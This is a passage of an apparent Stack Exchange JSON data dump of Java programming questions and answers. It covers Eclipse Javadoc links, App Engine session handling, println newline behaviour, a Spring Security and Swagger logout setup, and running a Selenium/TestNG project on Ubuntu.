noreferrer\">http://127.0.0.1:12861/help/nftopic/jar:file:/C:/Users/misa/.m2/repository/org/assertj/assertj-core/3.22.0/assertj-core-3.22.0-javadoc.jar!/org/assertj/core/api/Assertions.html#assertThat(double)</a></p>\n</blockquote>\n<p>opens the right Javadoc page. Regarding other libraries whose Javadoc jars are located in the local maven repository, the behavior is the same -- their javadoc don't open in the browser, but if I manually remove the package name from the the browser's address string, the required pages open.</p>\n<p>What may be the reason? Who is responsible for building the wrong address string that's passed to the browser, and how can I fix it or what workaround can be used?</p>\n"},{"tags":["java","google-app-engine","session"],"comments":[{"owner":{"account_id":1882918,"reputation":2458,"user_id":1702703,"accept_rate":29,"display_name":"Ramesh Lingappa"},"score":0,"creation_date":1424762323,"post_id":28689941,"comment_id":45671828,"body_markdown":"Can u be little more clear what do u mean by endpoints? U r using google cloud endpoints or plain old servlets or any Mvc frameworks like Spring, etc","body":"Can u be little more clear what do u mean by endpoints? U r using google cloud endpoints or plain old servlets or any Mvc frameworks like Spring, etc"},{"owner":{"account_id":5590846,"reputation":69,"user_id":4430114,"display_name":"user4430114"},"score":0,"creation_date":1424762513,"post_id":28689941,"comment_id":45671893,"body_markdown":"Yes i am using google cloud endpoints. and I want to get session attributes in google cloud endpoints class.","body":"Yes i am using google cloud endpoints. and I want to get session attributes in google cloud endpoints class."}],"answers":[{"tags":[],"owner":{"account_id":1882918,"reputation":2458,"user_id":1702703,"accept_rate":29,"display_name":"Ramesh Lingappa"},"down_vote_count":0,"up_vote_count":10,"is_accepted":true,"score":10,"last_activity_date":1642489627,"creation_date":1424762864,"answer_id":28690254,"question_id":28689941,"body_markdown":"Assuming you know about HttpSessions (if not it&#39;s simply cookie exchanged between sever and client in order to deal with the logged-in user).\r\n\r\nSo all user related or any other session-related information is stored in the server end and a session ID representing the information will be sent as cookie to the client, and the client will sent it back on every HTTP request.\r\n\r\nAppEngine uses Datastore to store the session information and memcache for faster access to that information. \r\n\r\nYou can access the session data using a standard HttpSession object injected in every HTTP request. \r\n\r\nThe code to access this HttpSession varies in frameworks you use. If you want, I can specify code snippets to help to understand. \r\n\r\nUPDATE:\r\n\r\nIf you are using servlets, then accessing session information will look like the following:\r\n\r\n    public class LoginServlet extends HttpServlet {\r\n    private static final long serialVersionUID = 1L;\r\n    private final String userID = &quot;Pankaj&quot;;\r\n    private final String password = &quot;journaldev&quot;;\r\n \r\n    protected void doPost(HttpServletRequest request,\r\n            HttpServletResponse response) {\r\n      HttpSession session=request.getSession();\r\n      // access any value\r\n      User user = (User)session.getAttribute(&quot;loggedInUser&quot;);\r\n    }\r\n\r\nAnd for Google Cloud endpoints, use the following: \r\n\r\n    @ApiMethod\r\n    public Response getUser( HttpServletRequest servletReq) {\r\n        HttpSession session = servletReq.getSession();\r\n        session.getAttribute(&quot;loggedInUser&quot;);\r\n    }","title":"How to deal with Sessions in Google App Engine?","body":"<p>Assuming you know about HttpSessions (if not it's simply cookie exchanged between sever and client in order to deal with the logged-in user).</p>\n<p>So all user related or any other session-related information is stored in the server end and a session ID representing the information will be sent as cookie to the client, and the client will sent it back on every HTTP request.</p>\n<p>AppEngine uses Datastore to store the session information and memcache for faster access to that information.</p>\n<p>You can access the session data using a standard HttpSession object injected in every HTTP request.</p>\n<p>The code to access this HttpSession varies in frameworks you use. If you want, I can specify code snippets to help to understand.</p>\n<p>UPDATE:</p>\n<p>If you are using servlets, then accessing session information will look like the following:</p>\n<pre><code>public class LoginServlet extends HttpServlet {\nprivate static final long serialVersionUID = 1L;\nprivate final String userID = &quot;Pankaj&quot;;\nprivate final String password = &quot;journaldev&quot;;\n\nprotected void doPost(HttpServletRequest request,\n        HttpServletResponse response) {\n  HttpSession session=request.getSession();\n  // access any value\n  User user = (User)session.getAttribute(&quot;loggedInUser&quot;);\n}\n</code></pre>\n<p>And for Google Cloud endpoints, use the following:</p>\n<pre><code>@ApiMethod\npublic Response getUser( HttpServletRequest servletReq) {\n    HttpSession session = servletReq.getSession();\n    session.getAttribute(&quot;loggedInUser&quot;);\n}\n</code></pre>\n"}],"owner":{"account_id":5590846,"reputation":69,"user_id":4430114,"display_name":"user4430114"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":5218,"favorite_count":0,"down_vote_count":0,"up_vote_count":4,"accepted_answer_id":28690254,"answer_count":1,"score":4,"last_activity_date":1642489627,"creation_date":1424761510,"question_id":28689941,"body_markdown":"I am successfully creating sessions in servlet and I can get sessions/ session attribute to jsp but not in endpoints class. I want to get the sessions info in endpoints classes. Please help me with this.\r\n\r\nI am using maven in eclipse and I enabled sessions in appengine-web.xml\r\n\r\nI read an [article][1] about this also except how to enable session I din&#39;t understand anything.\r\n\r\nThis servlet is to check whether there is an already a session \r\n\r\n    public class FirstServlet extends HttpServlet {\r\n\tprivate static final long serialVersionUID = 1L;\r\n    public FirstServlet () {\r\n        super();\r\n    }\r\n\tprotected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\r\n\t\tservice(request, response);\r\n\t}\r\n\tprotected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\r\n\t\tservice(request, response);\r\n\t}\r\n\t@Override\r\n\tprotected void service(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\r\n\t\tresponse.setContentType(&quot;text/html&quot;);\r\n\t\tHttpSession session=request.getSession(false);\r\n\t\tif (session != null) {\r\n            String name = session.getAttribute(&quot;name&quot;);\r\n            // do something\r\n\t\t} else {\r\n\t\t\t// do something\r\n\t\t}\r\n\t\t\r\n\t}\r\n    }\r\n\r\n\r\nIf session is not there create session using this servlet\r\n\r\n    public class SeccondServlet extends HttpServlet {\r\n\tprivate static final long serialVersionUID = 1L;\r\n    public SeccondServlet() {\r\n        super();\r\n    }\r\n\tprotected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\r\n\t\tservice(request, response);\r\n\t}\r\n\tprotected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\r\n\t\tservice(request, response);\r\n\t}\r\n\t\r\n\t@Override\r\n\t\r\n\tprotected void service(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\r\n\t\t\r\n\t\tresponse.setContentType(&quot;text/html&quot;);\r\n\t\trequest.getRequestDispatcher(&quot;login.html&quot;).include(request, response);\t\r\n\t\tString name = request.getParameter(&quot;name&quot;);\t\r\n\t\tHttpSession session=request.getSession();\r\n\t\tsession.setAttribute(&quot;name&quot;, name);\r\n\t    // do something \r\n\t}\r\n    }\r\n\r\nThis is my endpoints api class (Google Cloud Endpoints)\r\n\r\n    @Api(\r\n\t\tname = &quot;myapi&quot;,\r\n\t\tversion = &quot;v1&quot;,\r\n\t\tclientIds = &quot;given client ids&quot;)\r\n    public class MyApi{\r\n    \t@ApiMethod(name = &quot;name&quot;, path = &quot;name&quot;, httpMethod = &quot;post&quot;)\r\n\t\tpublic List&lt;String&gt; getUser( HttpServletRequest servletReq) {\r\n\t\t    HttpSession session = servletReq.getSession(false);\r\n\t\t    List&lt;String&gt; name= new ArrayList&lt;String&gt;();\r\n\t\t    if(session == null) {\r\n\t\t    \tuserName.add(&quot;no Name&quot;);\r\n\t\t    } else {\r\n\t\t    \tname.add((String)session.getAttribute(&quot;name&quot;));\r\n\t\t    }\r\n\t\t    \r\n\t\t   return name;\r\n\t\t}\r\n\r\nI am still getting &quot;no Name&quot; as result even though I created session and i can get the session attribute, here &quot;name&quot; \r\n\r\n  [1]: https://cloud.google.com/appengine/docs/java/config/appconfig#Java_appengine_web_xml_Enabling_sessions","title":"How to deal with Sessions in Google App Engine?","body":"<p>I am successfully creating sessions in servlet and I can get sessions/ session attribute to jsp but not in endpoints class. I want to get the sessions info in endpoints classes. Please help me with this.</p>\n\n<p>I am using maven in eclipse and I enabled sessions in appengine-web.xml</p>\n\n<p>I read an <a href=\"https://cloud.google.com/appengine/docs/java/config/appconfig#Java_appengine_web_xml_Enabling_sessions\" rel=\"nofollow\">article</a> about this also except how to enable session I din't understand anything.</p>\n\n<p>This servlet is to check whether there is an already a session </p>\n\n<pre><code>public class FirstServlet extends HttpServlet {\nprivate static final long serialVersionUID = 1L;\npublic FirstServlet () {\n    super();\n}\nprotected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n    service(request, response);\n}\nprotected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n    service(request, response);\n}\n@Override\nprotected void service(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n    response.setContentType(\"text/html\");\n    HttpSession session=request.getSession(false);\n    if (session != null) {\n        String name = session.getAttribute(\"name\");\n        // do something\n    } else {\n        // do something\n    }\n\n}\n}\n</code></pre>\n\n<p>If session is not there create session using this servlet</p>\n\n<pre><code>public class SeccondServlet extends HttpServlet {\nprivate static final long serialVersionUID = 1L;\npublic SeccondServlet() {\n    super();\n}\nprotected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n    service(request, response);\n}\nprotected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n    service(request, response);\n}\n\n@Override\n\nprotected void service(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n\n    response.setContentType(\"text/html\");\n    request.getRequestDispatcher(\"login.html\").include(request, response);  \n    String name = request.getParameter(\"name\"); \n    HttpSession session=request.getSession();\n    session.setAttribute(\"name\", name);\n    // do something \n}\n}\n</code></pre>\n\n<p>This is my endpoints api class (Google Cloud Endpoints)</p>\n\n<pre><code>@Api(\n    name = \"myapi\",\n    version = \"v1\",\n    clientIds = \"given client ids\")\npublic class MyApi{\n    @ApiMethod(name = \"name\", path = \"name\", httpMethod = \"post\")\n    public List&lt;String&gt; getUser( HttpServletRequest servletReq) {\n        HttpSession session = servletReq.getSession(false);\n        List&lt;String&gt; name= new ArrayList&lt;String&gt;();\n        if(session == null) {\n            userName.add(\"no Name\");\n        } else {\n            name.add((String)session.getAttribute(\"name\"));\n        }\n\n       return name;\n    }\n</code></pre>\n\n<p>I am still getting \"no Name\" as result even though I created session and i can get the session attribute, here \"name\" </p>\n"},{"tags":["java"],"comments":[{"owner":{"account_id":1691630,"reputation":49583,"user_id":1553851,"accept_rate":73,"display_name":"shmosel"},"score":2,"creation_date":1642488027,"post_id":70751230,"comment_id":125076630,"body_markdown":"`println()` always prints a line after the output.","body":"<code>println()</code> always prints a line after the output."},{"owner":{"account_id":22074264,"reputation":394,"user_id":16334830,"display_name":"Sai Suman Chitturi"},"score":0,"creation_date":1642488055,"post_id":70751230,"comment_id":125076639,"body_markdown":"What are you trying to achieve?","body":"What are you trying to achieve?"},{"owner":{"account_id":319873,"reputation":87612,"user_id":637853,"accept_rate":50,"display_name":"Thomas"},"score":0,"creation_date":1642488105,"post_id":70751230,"comment_id":125076648,"body_markdown":"No, the logic isn&#39;t the same. Your first program prints the &quot;newline&quot; character before the inner loop (which prints the lowercase characters), the second does so after it. That means your first program will have the lowercase characters at the beginning of the line and followed by the upper case characters while the second will make the line end with the lowercase characters (if there are any).","body":"No, the logic isn&#39;t the same. Your first program prints the &quot;newline&quot; character before the inner loop (which prints the lowercase characters), the second does so after it. That means your first program will have the lowercase characters at the beginning of the line and followed by the upper case characters while the second will make the line end with the lowercase characters (if there are any)."},{"owner":{"account_id":17928072,"reputation":3,"user_id":13026158,"display_name":"M V"},"score":0,"creation_date":1642488357,"post_id":70751230,"comment_id":125076699,"body_markdown":"@shmosel  . Shouldn&#39;t it just print on the new line and leave the cursor there ? was this always like this in java?","body":"@shmosel  . Shouldn&#39;t it just print on the new line and leave the cursor there ? was this always like this in java?"},{"owner":{"account_id":319873,"reputation":87612,"user_id":637853,"accept_rate":50,"display_name":"Thomas"},"score":0,"creation_date":1642488464,"post_id":70751230,"comment_id":125076721,"body_markdown":"&quot;Shouldn&#39;t it just print on the new line and leave the cursor there?&quot; - I&#39;m not sure what you mean. A &quot;newline&quot; means a new line is to be started - how that&#39;s interpreted depends on the program that displays the text but normally everything that&#39;s printed after a &quot;newline&quot; is displayed on the next line. This means: `println(&#39;A&#39;);print(&#39;B&#39;);` might result in `A\\nB` being printed which the console, file viewer or any other display program would likely interpret by displaying `A` and `B` on separate lines.","body":"&quot;Shouldn&#39;t it just print on the new line and leave the cursor there?&quot; - I&#39;m not sure what you mean. A &quot;newline&quot; means a new line is to be started - how that&#39;s interpreted depends on the program that displays the text but normally everything that&#39;s printed after a &quot;newline&quot; is displayed on the next line. This means: <code>println(&#39;A&#39;);print(&#39;B&#39;);</code> might result in <code>A\\nB</code> being printed which the console, file viewer or any other display program would likely interpret by displaying <code>A</code> and <code>B</code> on separate lines."},{"owner":{"account_id":319873,"reputation":87612,"user_id":637853,"accept_rate":50,"display_name":"Thomas"},"score":0,"creation_date":1642488649,"post_id":70751230,"comment_id":125076772,"body_markdown":"Btw, you could simplify your program by using just one loop and checking for the following conditions: Is the current character between A and Z? If so add a `println()` before printing the character unless you didn&#39;t print anything yet (maintain a separate boolean for that).","body":"Btw, you could simplify your program by using just one loop and checking for the following conditions: Is the current character between A and Z? If so add a <code>println()</code> before printing the character unless you didn&#39;t print anything yet (maintain a separate boolean for that)."},{"owner":{"account_id":17928072,"reputation":3,"user_id":13026158,"display_name":"M V"},"score":0,"creation_date":1642489046,"post_id":70751230,"comment_id":125076870,"body_markdown":"@Thomas. Thanks for the help . i understood what println does clearly now","body":"@Thomas. Thanks for the help . i understood what println does clearly now"}],"answers":[{"tags":[],"owner":{"account_id":47283,"reputation":703817,"user_id":139985,"accept_rate":69,"display_name":"Stephen C"},"down_vote_count":0,"up_vote_count":2,"is_accepted":true,"score":2,"last_activity_date":1642489244,"creation_date":1642488102,"answer_id":70751278,"question_id":70751230,"body_markdown":"Println renders and outputs its argument **followed by** whatever is configured as the JVM&#39;s end-of-line character sequence&lt;sup&gt;1&lt;/sup&gt;.\r\n\r\nThe normal behavior and expected behavior&lt;sup&gt;2&lt;/sup&gt; of a console program when it gets that sequence is to move to the start of the next line.\r\n\r\nIn the light of this, two versions of your program are clearly different.  The first version outputs a line separator after the first character, and not the last one.  The second version outputs a line separator after the last character of each word but not the first one.\r\n\r\nThe output you are getting reflects that difference.\r\n\r\n----------------------------\r\n\r\n&gt; &quot;Shouldn&#39;t it just print on the new line and leave the cursor there?&quot;\r\n\r\nWell, that depends on the console program&#39;s implementation.  But on platforms where `&quot;\\n&quot;` is the line separator, the default behavior of a console program *should* be to go to the *start* of the next line.  Whether that is correct in terms of the historical meaning of the ASCII `NL` characters as implemented by 1960&#39;s era teleprinters, etc is moot.\r\n\r\nThe fact that Linux and Windows console programs interpret these things is also a historical anomaly.  But you can get yourself into problems if you hard-wire `&quot;\\n&quot;` or `&quot;\\r\\n&quot;` into your output.  That is why `println` is provided, and why `Formatter.format` (etc) support `%n` as meaning line separator.\r\n\r\n----------------------------\r\n\r\n&lt;sup&gt;1 - On Windows it is `&quot;\\r\\n&quot;`, and on Linux it is `&quot;\\n&quot;`.&lt;br&gt;\r\n2 - However, the actual behavior depends on the implementation of the console.  That is outside of Java&#39;s control.&lt;/sup&gt;\r\n\r\n","title":"Does System.out.println move the cursor to the next line after printing in some cases?","body":"<p>Println renders and outputs its argument <strong>followed by</strong> whatever is configured as the JVM's end-of-line character sequence<sup>1</sup>.</p>\n<p>The normal behavior and expected behavior<sup>2</sup> of a console program when it gets that sequence is to move to the start of the next line.</p>\n<p>In the light of this, two versions of your program are clearly different.  The first version outputs a line separator after the first character, and not the last one.  The second version outputs a line separator after the last character of each word but not the first one.</p>\n<p>The output you are getting reflects that difference.</p>\n<hr />\n<blockquote>\n<p>&quot;Shouldn't it just print on the new line and leave the cursor there?&quot;</p>\n</blockquote>\n<p>Well, that depends on the console program's implementation.  But on platforms where <code>&quot;\\n&quot;</code> is the line separator, the default behavior of a console program <em>should</em> be to go to the <em>start</em> of the next line.  Whether that is correct in terms of the historical meaning of the ASCII <code>NL</code> characters as implemented by 1960's era teleprinters, etc is moot.</p>\n<p>The fact that Linux and Windows console programs interpret these things is also a historical anomaly.  But you can get yourself into problems if you hard-wire <code>&quot;\\n&quot;</code> or <code>&quot;\\r\\n&quot;</code> into your output.  That is why <code>println</code> is provided, and why <code>Formatter.format</code> (etc) support <code>%n</code> as meaning line separator.</p>\n<hr />\n<p><sup>1 - On Windows it is <code>&quot;\\r\\n&quot;</code>, and on Linux it is <code>&quot;\\n&quot;</code>.<br>\n2 - However, the actual behavior depends on the implementation of the console.  That is outside of Java's control.</sup></p>\n"}],"owner":{"account_id":17928072,"reputation":3,"user_id":13026158,"display_name":"M V"},"comment_count":7,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":1059,"favorite_count":0,"down_vote_count":2,"up_vote_count":0,"accepted_answer_id":70751278,"answer_count":1,"score":-2,"last_activity_date":1642489244,"creation_date":1642487776,"question_id":70751230,"body_markdown":"```\r\nimport java.util.Scanner;\r\n\r\npublic class CanYouReadThis {\r\n    public static void main(String[] args) {\r\n        Scanner scn = new Scanner(System.in);\r\n        String input = scn.next();\r\n        int i = 0;\r\n        while ( input.length() &gt; i &amp;&amp; input.charAt(i) &lt; &#39;a&#39;  )\r\n        {\r\n            System.out.println(input.charAt(i));\r\n            i++;\r\n            while(input.length() &gt; i &amp;&amp; input.charAt(i)&gt; &#39;Z&#39; )\r\n            {\r\n                System.out.print(input.charAt(i));\r\n                i++;\r\n            }\r\n            \r\n        }\r\n    }\r\n}\r\n\r\n```\r\nInput : IAmACompetitiveProgrammer &lt;br&gt;\r\nExcepted Ouput : &lt;br&gt;\r\n I &lt;br&gt;\r\n Am&lt;br&gt;\r\n A&lt;br&gt;\r\n Competitive&lt;br&gt;\r\n Programmer&lt;br&gt;&lt;br&gt;\r\nMy Output :&lt;br&gt;\r\nI&lt;br&gt;\r\nA&lt;br&gt;\r\nmA&lt;br&gt;\r\nC&lt;br&gt;\r\nompetitiveP&lt;br&gt;\r\nrogrammer&lt;br&gt;\r\n&lt;br&gt;\r\n```\r\nimport java.util.Scanner;\r\n\r\npublic class CanYouReadThis {\r\n    public static void main(String[] args) {\r\n        Scanner scn = new Scanner(System.in);\r\n        String input = scn.next();\r\n        int i = 0;\r\n        while ( input.length() &gt; i &amp;&amp; input.charAt(i) &lt; &#39;a&#39;  )\r\n        {\r\n            System.out.print(input.charAt(i)); // removed ln\r\n            i++;\r\n            while(input.length() &gt; i &amp;&amp; input.charAt(i)&gt; &#39;Z&#39; )\r\n            {\r\n                System.out.print(input.charAt(i));\r\n                i++;\r\n            }\r\n            System.out.println(); // Added this line\r\n        }\r\n    }\r\n}\r\n```\r\nI made these changes to my code and it works fine . But isn&#39;t the logic of  both programs the same. What am i missing here ? Please help me out .\r\n\r\n","title":"Does System.out.println move the cursor to the next line after printing in some cases?","body":"<pre><code>import java.util.Scanner;\n\npublic class CanYouReadThis {\n    public static void main(String[] args) {\n        Scanner scn = new Scanner(System.in);\n        String input = scn.next();\n        int i = 0;\n        while ( input.length() &gt; i &amp;&amp; input.charAt(i) &lt; 'a'  )\n        {\n            System.out.println(input.charAt(i));\n            i++;\n            while(input.length() &gt; i &amp;&amp; input.charAt(i)&gt; 'Z' )\n            {\n                System.out.print(input.charAt(i));\n                i++;\n            }\n            \n        }\n    }\n}\n\n</code></pre>\n<p>Input : IAmACompetitiveProgrammer <br>\nExcepted Ouput : <br>\nI <br>\nAm<br>\nA<br>\nCompetitive<br>\nProgrammer<br><br>\nMy Output :<br>\nI<br>\nA<br>\nmA<br>\nC<br>\nompetitiveP<br>\nrogrammer<br>\n<br></p>\n<pre><code>import java.util.Scanner;\n\npublic class CanYouReadThis {\n    public static void main(String[] args) {\n        Scanner scn = new Scanner(System.in);\n        String input = scn.next();\n        int i = 0;\n        while ( input.length() &gt; i &amp;&amp; input.charAt(i) &lt; 'a'  )\n        {\n            System.out.print(input.charAt(i)); // removed ln\n            i++;\n            while(input.length() &gt; i &amp;&amp; input.charAt(i)&gt; 'Z' )\n            {\n                System.out.print(input.charAt(i));\n                i++;\n            }\n            System.out.println(); // Added this line\n        }\n    }\n}\n</code></pre>\n<p>I made these changes to my code and it works fine . But isn't the logic of  both programs the same. What am i missing here ? Please help me out .</p>\n"},{"tags":["java","spring","spring-security","swagger","springfox"],"owner":{"account_id":19206274,"reputation":107,"user_id":14033074,"display_name":"Sampeteq"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":1258,"favorite_count":0,"down_vote_count":0,"up_vote_count":2,"answer_count":0,"score":2,"last_activity_date":1642489141,"creation_date":1642445182,"question_id":70746139,"body_markdown":"How to get login/logout option in Swagger? After app starting I can click on the secure endpoint and I&#39;m asked about my credentials. After successfully logging all works with no problem but I don&#39;t have option in Swagger to logout to change user. I can only use localhost:8080/logout. I get a proper communicate I&#39;m logout but when I go again on localhost:8080/swagger-ui/ I&#39;m still logged on the previous user. I want to get some just like that:\r\n[![Swagger example][1]][1]\r\n\r\n\r\n  [1]: https://i.stack.imgur.com/zRSoo.png\r\n\r\nMy Spring Security config:\r\n\r\n    import org.springframework.context.annotation.Configuration;\r\n    import org.springframework.security.config.annotation.web.builders.HttpSecurity;\r\n    import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;\r\n\r\n    @Configuration\r\n    class SecurityConfig extends WebSecurityConfigurerAdapter {\r\n\r\n    private static final String[] permitAllEndpoints = {\r\n\r\n            &quot;/api/registration&quot;,\r\n            &quot;/h2/console/**&quot;,\r\n            &quot;/v2/api-docs&quot;,\r\n            &quot;/v3/api-docs/**&quot;,\r\n            &quot;/swagger-resources/**&quot;,\r\n            &quot;/swagger-ui/**&quot;\r\n    };\r\n\r\n    @Override\r\n    protected void configure(HttpSecurity http) throws Exception {\r\n\r\n        http\r\n                .httpBasic()\r\n                .and()\r\n                .formLogin()\r\n                .permitAll()\r\n                .and()\r\n                .logout()\r\n                .permitAll()\r\n                .and()\r\n                .authorizeRequests()\r\n                .mvcMatchers(permitAllEndpoints)\r\n                .permitAll()\r\n                .mvcMatchers(&quot;api/admin/**&quot;)\r\n                .hasAnyAuthority(&quot;ADMIN&quot;)\r\n                .anyRequest()\r\n                .authenticated()\r\n                .and()\r\n                .csrf()\r\n                .disable()\r\n                .headers()\r\n                .frameOptions()\r\n                .disable();\r\n      }\r\n    }\r\n\r\nMy Swagger config:\r\n\r\n    import org.springframework.context.annotation.Bean;\r\n    import org.springframework.context.annotation.Configuration;\r\n    import springfox.documentation.builders.PathSelectors;\r\n    import springfox.documentation.spi.DocumentationType;\r\n    import springfox.documentation.spring.web.plugins.Docket;\r\n\r\n    @Configuration \r\n    class SwaggerConfig {\r\n\r\n    @Bean\r\n    Docket api()  {\r\n\r\n        return new Docket(DocumentationType.OAS_30)\r\n                .select()\r\n                .paths(PathSelectors.ant(&quot;/api/**&quot;))\r\n                .build();\r\n      }\r\n    }","title":"Spring Security login/logout Swagger","body":"<p>How to get login/logout option in Swagger? After app starting I can click on the secure endpoint and I'm asked about my credentials. After successfully logging all works with no problem but I don't have option in Swagger to logout to change user. I can only use localhost:8080/logout. I get a proper communicate I'm logout but when I go again on localhost:8080/swagger-ui/ I'm still logged on the previous user. I want to get some just like that:\n<a href=\"https://i.stack.imgur.com/zRSoo.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/zRSoo.png\" alt=\"Swagger example\" /></a></p>\n<p>My Spring Security config:</p>\n<pre><code>import org.springframework.context.annotation.Configuration;\nimport org.springframework.security.config.annotation.web.builders.HttpSecurity;\nimport org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;\n\n@Configuration\nclass SecurityConfig extends WebSecurityConfigurerAdapter {\n\nprivate static final String[] permitAllEndpoints = {\n\n        &quot;/api/registration&quot;,\n        &quot;/h2/console/**&quot;,\n        &quot;/v2/api-docs&quot;,\n        &quot;/v3/api-docs/**&quot;,\n        &quot;/swagger-resources/**&quot;,\n        &quot;/swagger-ui/**&quot;\n};\n\n@Override\nprotected void configure(HttpSecurity http) throws Exception {\n\n    http\n            .httpBasic()\n            .and()\n            .formLogin()\n            .permitAll()\n            .and()\n            .logout()\n            .permitAll()\n            .and()\n            .authorizeRequests()\n            .mvcMatchers(permitAllEndpoints)\n            .permitAll()\n            .mvcMatchers(&quot;api/admin/**&quot;)\n            .hasAnyAuthority(&quot;ADMIN&quot;)\n            .anyRequest()\n            .authenticated()\n            .and()\n            .csrf()\n            .disable()\n            .headers()\n            .frameOptions()\n            .disable();\n  }\n}\n</code></pre>\n<p>My Swagger config:</p>\n<pre><code>import org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport springfox.documentation.builders.PathSelectors;\nimport springfox.documentation.spi.DocumentationType;\nimport springfox.documentation.spring.web.plugins.Docket;\n\n@Configuration \nclass SwaggerConfig {\n\n@Bean\nDocket api()  {\n\n    return new Docket(DocumentationType.OAS_30)\n            .select()\n            .paths(PathSelectors.ant(&quot;/api/**&quot;))\n            .build();\n  }\n}\n</code></pre>\n"},{"tags":["java","selenium","ubuntu"],"comments":[{"owner":{"account_id":5998820,"reputation":12666,"user_id":4712734,"display_name":"DuncG"},"score":0,"creation_date":1642061546,"post_id":70690589,"comment_id":124973071,"body_markdown":"You have not supplied any classpath for the build - org.testng is not part of JDK.","body":"You have not supplied any classpath for the build - org.testng is not part of JDK."}],"answers":[{"tags":[],"owner":{"account_id":6788662,"reputation":2778,"user_id":5226491,"display_name":"Max Daroshchanka"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1642488125,"creation_date":1642409489,"answer_id":70738670,"question_id":70690589,"body_markdown":"To run the selenium/testNG project on Ubuntu you have to:\r\n\r\n1 Install Java\r\nhttps://askubuntu.com/questions/48468/how-do-i-install-java\r\n\r\nlooks like this is already done since you got more detailed java error messages, \r\nwhich means you have no required packages.. so\r\n\r\n2 Make sure, you have all the required libraries `.jar` files within your project\r\n\r\n - org.testng\r\n - org.openqa.selenium\r\n\r\n3 You have to compile the class you want to run.\r\n\r\nFor the project when you have all the files in one directory:\r\n\r\n```\r\njavac TestNGSandBox.java -cp testng.jar; selenium.jar; ... other dependencies if needed\r\n```\r\n\r\n4 Run the class:\r\n\r\n```\r\njava -cp testng.jar; selenium.jar; TestNGSandBox\r\n```\r\n\r\n---\r\n\r\nBut using javac/java for managing projects is time-consuming. Try to look at Maven/Gradle tools, which help to build projects and manage dependencies.\r\n\r\nTake a look at some selenium-maven-TestNG project skeletons\r\n\r\n - https://github.com/khoamle/selenium-java\r\n - https://github.com/lalit-k/selenium-java-tests \r\n - https://github.com/nusratahmed/maven-selenium-webdriver-testng-example-project","title":"How can I transfer Java project from Windows to Ubuntu 20.04? (NO GUI version)","body":"<p>To run the selenium/testNG project on Ubuntu you have to:</p>\n<p>1 Install Java\n<a href=\"https://askubuntu.com/questions/48468/how-do-i-install-java\">https://askubuntu.com/questions/48468/how-do-i-install-java</a></p>\n<p>looks like this is already done since you got more detailed java error messages,\nwhich means you have no required packages.. so</p>\n<p>2 Make sure, you have all the required libraries <code>.jar</code> files within your project</p>\n<ul>\n<li>org.testng</li>\n<li>org.openqa.selenium</li>\n</ul>\n<p>3 You have to compile the class you want to run.</p>\n<p>For the project when you have all the files in one directory:</p>\n<pre><code>javac TestNGSandBox.java -cp testng.jar; selenium.jar; ... other dependencies if needed\n</code></pre>\n<p>4 Run the class:</p>\n<pre><code>java -cp testng.jar; selenium.jar; TestNGSandBox\n</code></pre>\n<hr />\n<p>But using javac/java for managing projects is time-consuming. Try to look at Maven/Gradle tools, which help to build projects and manage dependencies.</p>\n<p>Take a look at some selenium-maven-TestNG project skeletons</p>\n<ul>\n<li><a href=\"https://github.com/khoamle/selenium-java\" rel=\"nofollow noreferrer\">https://github.com/khoamle/selenium-java</a></li>\n<li><a href=\"https://github.com/lalit-k/selenium-java-tests\" rel=\"nofollow noreferrer\">https://github.com/lalit-k/selenium-java-tests</a></li>\n<li><a href=\"https://github.com/nusratahmed/maven-selenium-webdriver-testng-example-project\" rel=\"nofollow noreferrer\">https://github.com/nusratahmed/maven-selenium-webdriver-testng-example-project</a></li>\n</ul>\n"}],"owner":{"account_id":22890170,"reputation":161,"user_id":17030420,"display_name":"deokyong song"},"comment_count":1,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":97,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":1,"score":0,"last_activity_date":1642488125,"creation_date":1642039393,"question_id":70690589,"body_markdown":"I am trying to run my Selenium code in Ubuntu server and I saw some articles that Java is indenpendent with OS so I thought my Java selenium code would run without any configurations.\r\n\r\nHowever, when I run my Selenium code in Ubuntu server, it comes out heaps of error followings\r\n\r\n```\r\nTestNGSandBox.java:16: error: package org.testng does not exist\r\nimport static org.testng.Assert.assertEquals;\r\n                        ^\r\nTestNGSandBox.java:16: error: static import only from classes and interfaces\r\nimport static org.testng.Assert.assertEquals;\r\n^\r\nTestNGSandBox.java:17: error: package org.testng does not exist\r\nimport static org.testng.Assert.assertFalse;\r\n                        ^\r\nTestNGSandBox.java:17: error: static import only from classes and interfaces\r\nimport static org.testng.Assert.assertFalse;\r\n^\r\nTestNGSandBox.java:18: error: package org.testng does not exist\r\nimport static org.testng.Assert.assertTrue;\r\n                        ^\r\nTestNGSandBox.java:18: error: static import only from classes and interfaces\r\nimport static org.testng.Assert.assertTrue;\r\n^\r\nTestNGSandBox.java:19: error: package org.testng does not exist\r\nimport static org.testng.Assert.fail;\r\n                        ^\r\nTestNGSandBox.java:19: error: static import only from classes and interfaces\r\nimport static 